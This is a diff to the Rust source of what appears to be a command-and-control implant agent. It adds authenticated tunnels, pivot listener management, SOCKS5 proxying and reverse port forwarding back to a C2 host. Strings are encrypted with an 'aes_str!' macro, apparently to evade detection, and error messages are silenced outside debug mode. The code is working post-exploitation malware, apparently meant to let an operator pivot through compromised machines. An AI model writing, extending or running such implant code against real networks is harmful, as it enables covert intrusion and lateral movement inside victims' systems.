@@ -8,9 +8,22 @@ use futures::StreamExt;
 use crate::socks;
 use crate::strcrypt_rt;
 use strcrypt::aes_str;
-use super::{HandlerContext, DispatchResult, AgentAction, RportfwdHandle};
+use super::{HandlerContext, DispatchResult, AgentAction, RportfwdHandle, wrap_result};
 
 // ── Helpers ────────────────────────────────────────────────────────────
+
+/// Present the per-tunnel auth token to the server right after connect,
+/// before yamux starts. The server requires this proof that the peer
+/// received the proxy:start / rportfwd:start command; a failed write means
+/// the tunnel is dead either way, so the error is just logged.
+async fn send_tunnel_token(stream: &mut TcpStream, token: &str) {
+    use tokio::io::AsyncWriteExt;
+    if let Err(e) = stream.write_all(token.as_bytes()).await {
+        if crate::agent::config::load().debug {
+            eprintln!("{} {}", aes_str!("[tunnel] token write failed:"), e);
+        }
+    }
+}
 
 /// Extract the bare host from c2_host, stripping any URL scheme.
 ///
@@ -36,33 +49,60 @@ fn bare_host(c2_host: &str) -> &str {
 
 // ── Pivot ──────────────────────────────────────────────────────────────
 
-pub async fn handle_pivot_tcp(ctx: &HandlerContext, args: &str) -> DispatchResult {
+pub(crate) async fn handle_pivot_tcp(ctx: &HandlerContext, args: &str) -> DispatchResult {
     let port = args.trim().parse::<u16>().unwrap_or(0);
     if port == 0 {
         return DispatchResult::Reply(String::new(), aes_str!("Invalid Port"), 1, AgentAction::None);
     }
     let res = ctx.pivot_mgr.lock().await.start_agent_listener(port).await;
-    DispatchResult::Reply(res, String::new(), 0, AgentAction::None)
+    wrap_result(res)
 }
 
-pub async fn handle_pivot_smb(ctx: &HandlerContext, args: &str) -> DispatchResult {
+pub(crate) async fn handle_pivot_smb(ctx: &HandlerContext, args: &str) -> DispatchResult {
     let name = args.trim();
     if name.is_empty() {
         return DispatchResult::Reply(String::new(), aes_str!("Usage: pivot:listener_smb <pipe_name>"), 1, AgentAction::None);
     }
     let res = ctx.pivot_mgr.lock().await.start_named_pipe_listener(name.to_string()).await;
-    DispatchResult::Reply(res, String::new(), 0, AgentAction::None)
+    wrap_result(res)
+}
+
+pub(crate) async fn handle_pivot_list(ctx: &HandlerContext) -> DispatchResult {
+    let listeners = ctx.pivot_mgr.lock().await.list_listeners();
+    if listeners.is_empty() {
+        return DispatchResult::Reply(aes_str!("No active pivot listeners"), String::new(), 0, AgentAction::None);
+    }
+    let mut lines = vec![aes_str!("ID  LISTENER            LINKS")];
+    for (id, desc, links) in listeners {
+        lines.push(format!("{:<4}{:<20}{}", id, desc, links));
+    }
+    DispatchResult::Reply(lines.join("\n"), String::new(), 0, AgentAction::None)
+}
+
+pub(crate) async fn handle_pivot_stop(ctx: &HandlerContext, args: &str) -> DispatchResult {
+    let id = match args.trim().parse::<u32>() {
+        Ok(i) => i,
+        Err(_) => return DispatchResult::Reply(String::new(), aes_str!("Usage: pivot:stop <listener_id>"), 1, AgentAction::None),
+    };
+    let res = ctx.pivot_mgr.lock().await.stop_listener(id).await;
+    wrap_result(res)
 }
 
 // ── SOCKS Proxy ────────────────────────────────────────────────────────
 
 pub async fn handle_proxy_start(ctx: &HandlerContext, cmd: &str, _req_id: u64) -> (String, String, i32) {
     let parts: Vec<&str> = cmd.split_whitespace().collect();
-    if parts.len() != 2 { return (String::new(), aes_str!("Usage: proxy:start <port>"), 1); }
+    if parts.len() < 2 || parts.len() > 3 {
+        return (String::new(), aes_str!("Usage: proxy:start <port> [tunnel_token]"), 1);
+    }
     let port = match parts[1].parse::<u16>() {
         Ok(p) => p,
         Err(_) => return (String::new(), aes_str!("Invalid Port"), 1),
     };
+
+    // Per-tunnel auth token issued by the server; presented right after the
+    // tunnel connect so the server knows this peer received the command.
+    let token = parts.get(2).map(|s| s.to_string());
 
     let warning = if ctx.c2_host.starts_with(&aes_str!("http://")) || ctx.c2_host.starts_with(&aes_str!("https://")) {
         aes_str!("[!] WARNING: Agent uses HTTP transport but proxy:start opens a raw TCP connection. \
@@ -84,7 +124,10 @@ pub async fn handle_proxy_start(ctx: &HandlerContext, cmd: &str, _req_id: u64) -
     let handle = tokio::spawn(async move {
         let addr = format!("{}:{}", host, port);
         match TcpStream::connect(&addr).await {
-            Ok(stream) => {
+            Ok(mut stream) => {
+                if let Some(t) = token.as_deref() {
+                    send_tunnel_token(&mut stream, t).await;
+                }
                 let stream = Box::pin(TokioAsyncReadCompatExt::compat(stream));
                 let connection = Connection::new(stream, yamux::Config::default(), yamux::Mode::Client);
                 // The server opens streams (yamux Server mode); we accept them and run SOCKS5.
@@ -98,7 +141,9 @@ pub async fn handle_proxy_start(ctx: &HandlerContext, cmd: &str, _req_id: u64) -
                     .await;
             }
             Err(e) => {
-                eprintln!("{} {}: {}", aes_str!("[Proxy] Failed to connect tunnel to"), addr, e);
+                if crate::agent::config::load().debug {
+                    eprintln!("{} {}: {}", aes_str!("[Proxy] Failed to connect tunnel to"), addr, e);
+                }
             }
         }
     });
@@ -126,12 +171,12 @@ pub fn handle_proxy_stop(ctx: &HandlerContext) -> (String, String, i32) {
 
 // ── Reverse Port Forwarding ────────────────────────────────────────────
 
-pub async fn handle_rportfwd_start(ctx: &HandlerContext, cmd: &str) -> DispatchResult {
+pub(crate) async fn handle_rportfwd_start(ctx: &HandlerContext, cmd: &str) -> DispatchResult {
     let parts: Vec<&str> = cmd.split_whitespace().collect();
-    if parts.len() != 4 {
+    if parts.len() != 4 && parts.len() != 5 {
         return DispatchResult::Reply(
             String::new(),
-            aes_str!("Usage: rportfwd:start <tunnel_port> <target_host> <target_port>"),
+            aes_str!("Usage: rportfwd:start <tunnel_port> [tunnel_token] <target_host> <target_port>"),
             1, AgentAction::None,
         );
     }
@@ -140,10 +185,20 @@ pub async fn handle_rportfwd_start(ctx: &HandlerContext, cmd: &str) -> DispatchR
         Ok(p) => p,
         Err(_) => return DispatchResult::Reply(String::new(), aes_str!("Invalid tunnel port"), 1, AgentAction::None),
     };
-    let target_host = parts[2].to_string();
-    let target_port = match parts[3].parse::<u16>() {
-        Ok(p) => p,
-        Err(_) => return DispatchResult::Reply(String::new(), aes_str!("Invalid target port"), 1, AgentAction::None),
+    // Servers that require tunnel authentication send the token between the
+    // tunnel port and the target; legacy 4-part commands have no token.
+    let (token, target_host, target_port) = if parts.len() == 5 {
+        let tp = match parts[4].parse::<u16>() {
+            Ok(p) => p,
+            Err(_) => return DispatchResult::Reply(String::new(), aes_str!("Invalid target port"), 1, AgentAction::None),
+        };
+        (Some(parts[2].to_string()), parts[3].to_string(), tp)
+    } else {
+        let tp = match parts[3].parse::<u16>() {
+            Ok(p) => p,
+            Err(_) => return DispatchResult::Reply(String::new(), aes_str!("Invalid target port"), 1, AgentAction::None),
+        };
+        (None, parts[2].to_string(), tp)
     };
 
     if let Ok(handles) = ctx.rportfwd_handles.lock() {
@@ -163,13 +218,19 @@ pub async fn handle_rportfwd_start(ctx: &HandlerContext, cmd: &str) -> DispatchR
 
     let task = tokio::spawn(async move {
         let addr = format!("{}:{}", c2_host, tunnel_port);
-        let stream = match TcpStream::connect(&addr).await {
+        let mut stream = match TcpStream::connect(&addr).await {
             Ok(s) => s,
             Err(e) => {
-                eprintln!("{} {}: {}", aes_str!("[rportfwd] Failed to connect tunnel to"), addr, e);
+                if crate::agent::config::load().debug {
+                    eprintln!("{} {}: {}", aes_str!("[rportfwd] Failed to connect tunnel to"), addr, e);
+                }
                 return;
             }
         };
+
+        if let Some(t) = token.as_deref() {
+            send_tunnel_token(&mut stream, t).await;
+        }
 
         let stream = Box::pin(TokioAsyncReadCompatExt::compat(stream));
         let connection = Connection::new(stream, yamux::Config::default(), yamux::Mode::Client);
@@ -215,7 +276,7 @@ pub async fn handle_rportfwd_start(ctx: &HandlerContext, cmd: &str) -> DispatchR
     )
 }
 
-pub fn handle_rportfwd_stop(ctx: &HandlerContext, cmd: &str) -> DispatchResult {
+pub(crate) fn handle_rportfwd_stop(ctx: &HandlerContext, cmd: &str) -> DispatchResult {
     let parts: Vec<&str> = cmd.split_whitespace().collect();
     if parts.len() != 2 {
         return DispatchResult::Reply(String::new(), aes_str!("Usage: rportfwd:stop <tunnel_port>"), 1, AgentAction::None);
@@ -242,7 +303,7 @@ pub fn handle_rportfwd_stop(ctx: &HandlerContext, cmd: &str) -> DispatchResult {
     }
 }
 
-pub fn handle_rportfwd_list(ctx: &HandlerContext) -> DispatchResult {
+pub(crate) fn handle_rportfwd_list(ctx: &HandlerContext) -> DispatchResult {
     match ctx.rportfwd_handles.lock() {
         Ok(handles) => {
             if handles.is_empty() {
